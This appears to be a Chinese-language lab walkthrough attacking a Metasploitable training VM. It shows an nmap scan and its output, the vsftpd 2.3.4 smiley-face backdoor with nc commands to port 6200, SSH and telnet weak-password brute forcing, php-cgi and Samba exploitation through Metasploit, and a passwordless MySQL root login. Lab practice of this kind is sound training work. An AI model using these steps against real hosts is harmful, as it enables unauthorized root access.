1.扫描主机和端口
nmap 192.168.89.138 -sV -sS -n
​
2.nmap 192.168.89.138 -sV -sS -n发现对应服务  

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
```
**漏洞部分**
**1.21号端口的vsftpd 2.3.4**
笑脸漏洞 CVE-2011-2523
 使用nc 192.168.89.138 21连接靶机的ftp服务后，输入用户名时只要在末尾加上:)，然后随便输入密码就可以开启6200端口，然后用攻击机去连接6200端口就可以直接获得root权限 nc 192.168.89.138 6200  虽然我测试不知道为什么不行 是直接用msf 攻击的 msf只用设置一个参数就行了
在特定版本的vsftpd服务器程序中，被人恶意植入代码，当用户名以“:)”为结尾，服务器就会在6200端口监听，并且能够执行任意代码
2.ssh登录存在弱口令  22端口
实际上可以直接进行爆破，用字典
使用ssh msfadmin@192.168.89.138 可以连接靶机进行登录，版本差异修复

```bash
# 核心：-o HostKeyAlgorithms=+ssh-rsa 启用ssh-rsa算法，解决协商失败
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.89.138

```
3.telnet存在弱口令
也是爆破
telnet 192.168.89.138登录
4.http 80端口 php-cgi
访问web页面的phpinfo.php页面，然后得到php版本，搜索对应的漏洞，知道php-cgi存在特定漏洞，然后使用msfconsole设置对应参数就能执行漏洞获得权限
CGI脚本没有正确处理请求参数，导致源代码泄露，允许远程攻击者在请求参数中插入执行命令
5.139端口 samba相关漏洞
msf查找samba相关漏洞，可以使用info显示每个模块的相关信息，然后进行调用模块，基本都只用设置一个远程主机ip就可以直接进行漏洞利用
Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给/bin/sh，允许攻击者以nobody用户的权限执行任意命令
6.mysql 3306端口
使用mysql -h 192.168.89.138 -u root理论可以登录，但实际使用mysql -h 192.168.89.138 -u root --skip-ssl
才能登录进去，能直接登录的主要原因是靶机配置很低为root用户没有设置密码，空密码，所以直接使用root的用户名就能连接到mysql数据库
